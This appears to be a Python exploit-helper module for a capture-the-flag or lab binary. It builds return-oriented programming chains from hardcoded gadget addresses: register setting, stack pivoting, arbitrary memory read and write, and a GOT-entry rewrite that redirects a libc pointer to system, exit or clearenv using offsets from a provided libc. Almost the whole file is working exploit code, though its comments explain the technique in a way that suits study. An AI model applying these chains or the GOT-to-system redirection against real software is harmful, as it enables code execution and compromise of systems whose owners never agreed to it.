import random
import sys

def debug(*args, **kwargs):
    print(*args, **kwargs, file = sys.stderr)

def p64(v):
    """
    better packing of bytes
    """
    if isinstance(v, bytes) and len(v) == 8:
        return v
    if not (isinstance(v, int) and v.bit_length() <= 64):
        raise ValueError("v should be bytes of length 8 *or* "
                         "int representable with <= 64 bits")
    return v.to_bytes(8, "little", signed = v < 0)



###########################################
### GADGETS AND CHAINS TO SET REGISTERS ###
###########################################
def set_rdi_gadget(rdi_new):
    """
    40 12 73 : pop rdi ; ret
    """
    return p64(0x401273) + p64(rdi_new)

def set_rsi_gadget(rsi_new):
    """
    40 12 71 : pop rsi ; pop r15 ; ret
    """
    return p64(0x401271) + p64(rsi_new) + p64(0)

def set_rsp_gadget(rsp_new):
    """
    40 11 e0 : pop rsp; pop r13; ret

    BEWARE when migrating stack: first quadword at `rsp_new` is popped into r13!
    """
    return p64(0x4011e0) + p64(rsp_new)

def set_rbx_gadget(rbx_new):
    """
    04 11 dd : pop rbx; pop rbp ; pop r12 ; pop r13 ; ret
    """
    return p64(0x4011dd) + p64(rbx_new) + 3 * rand_bytes(8)

def set_rax_chain(rax_new):
    return (set_rdi_gadget(rax_new) # insert write_val on stack and skip over it.
          + set_rdi_gadget(4)       # when we reach the `mov rax` ins, write_val will
                             # be at [rsp + 4 * 8 - 0x40], so we set rdi = 4.
          + p64(0x40114c))   # mov rax, qword [rsp+rdi*8-0x40].



class LibcCaller():
    fs = { "__libc_start_main": 0x23f90,
           "system":            0x52290,
           "exit":              0x46a40,
           "clearenv":          0x466b0,
         }

    def __get_libc_call_chain(cur_f, next_f,
                          addr_GOT,
                          rdi,
                          rsi,
                          no_assume_rbx,
                          do_stack_align,
                         ):
        """
        a chain to setup and execute calls to libc functions. requires knowledge of
        which function address is currently held in the GOT entry.
        by default assumes that rbx is already set and that stack is aligned.
        """
        jmp_rbx_gadget = p64(0x40118f) # 40 11 8f : jmp qword ptr [rbx]

        # useful libc addresses in the provided libc.so.6.
        fs = { "__libc_start_main": 0x23f90,
               "system":            0x52290,
               "exit":              0x46a40,
               "clearenv":          0x466b0,
             }

        # update current value of GOT entry to point to the next function.
        libc_offset = fs[next_f] - fs[cur_f]
        res = mem_add_chain(addr_GOT, libc_offset)

        # add arguments, if necessary.
        if rdi is not None: res += set_rdi_gadget(rdi)
        if rsi is not None: res += set_rsi_gadget(rsi)

        # if we don't assume rbx is already set, do it now.
        if no_assume_rbx: res += set_rbx_gadget(addr_GOT)

        #  align stack if necessary.
        if do_stack_align: res += stack_align_gadget

        res += jmp_rbx_gadget
        return res

    def __init__(self, addr_GOT):
        self.cur_f    = "__libc_start_main"
        self.addr_GOT = addr_GOT

    def call_libc_chain(self, next_f,
                        rdi = None,
                        rsi = None,
                        *,
                        no_assume_rbx  = False,
                        do_stack_align = False,
                       ):
        if next_f not in LibcCaller.fs:
            raise ValueError("Unknown libc function! Look it up in libc.so.6 "
                             "and add it to `LibCaller.fs`")
        libc_call_chain = LibcCaller.__get_libc_call_chain(
            self.cur_f, next_f, self.addr_GOT, rdi, rsi,
            no_assume_rbx, do_stack_align)
        self.cur_f = next_f
        return libc_call_chain



###################################
### READ, WRITE, AND MODIFY MEM ###
###################################
def mem_add_chain(dest, val):
    """
    a chain to add `val` to memory at address `dest`
    `40 11 0a : add [rdi], rsi; ret`
    """
    gadget_add_rdi_rsi = p64(0x40110a)
    return set_rsi_gadget(val) + set_rdi_gadget(dest) + gadget_add_rdi_rsi


def qword_read_chain(addr, current_rsp):
    """
    arbitrary memory read of mem at `addr` into rax, given `current_rsp`, the
    value of rsp *before* jumping to this chain
    """
    current_rsp += 3*8 # to account for the offset into the current chain
    rdi_new = (addr + 0x40 - current_rsp) // 8
    return set_rdi_gadget(rdi_new) + p64(0x40114c)


def qword_write_chain(write_addr, write_val = None):
    """
    arbitrary memory write of a quadword `write_val` to address `write_addr`.
    if rax is already set up with a write value, use write_val = None. this
    chain costs 8 quadwords of ROP-chain space.
    """
    if write_val is None: # if rax already set.
        return set_rdi_gadget(write_addr) + p64(0x4011d2)
    return (set_rax_chain(write_val)
          + set_rdi_gadget(write_addr)
          + p64(0x4011d2))

def arbitrary_write_chain(start_addr, s, do_shuffle = True):
    """
    this chain can be used to write an arbitrary string s to some writable
    address start_addr.
    """
    if isinstance(s, str):
        s = bytes(s, encoding = "ascii")
    elif isinstance(s, int):
        s = p64(s)
    if not isinstance(s, bytes):
        raise ValueError("Second argument must be str, int, or bytes!")

    # round up to nearest multiple of 8 then pad the string with null bytes.
    n = len(s) + (not s.endswith(b"\0")) + 7 & ~7
    s += (n - len(s)) * b"\x00"

    write_chains = [qword_write_chain(start_addr + i, s[i:i+8])
                    for i in range(0, n, 8)]
    if do_shuffle:
        random.shuffle(write_chains)
    return b"".join(write_chains)

def qword_copy_chain(src, dest, current_rsp):
    return qword_read_chain(src, current_rsp) + qword_write_chain(dest)

############
### MISC ###
############
def do_align(chain):
    """
    used to align the stack before certain libc calls, eg. those which contain
    vector instructions as these typically require 16 byte alignment.
    0x40101a is simply a `ret`.
    """
    align_gadget = p64(0x40101a)
    return chain + align_gadget if len(chain) % 16 != 8 else chain

def rand_bytes(n):
    """
    totally random bytes. *wink wink*
    """
    totally_random_qword = p64(0x323167696d766967)
    return totally_random_qword * (n // 8) + bytes([69]) * (n % 8)

# can be used as gdb breakpoint by using `b *(0x40120d)` in gdb.
# 0x40120d is main's ret, since it should never be hit.
breakpoint_gadget  = p64(0x40120d)
# hash_wrapper's ret instruction. used to align stack when/if necessary.
stack_align_gadget = p64(0x4011ff)
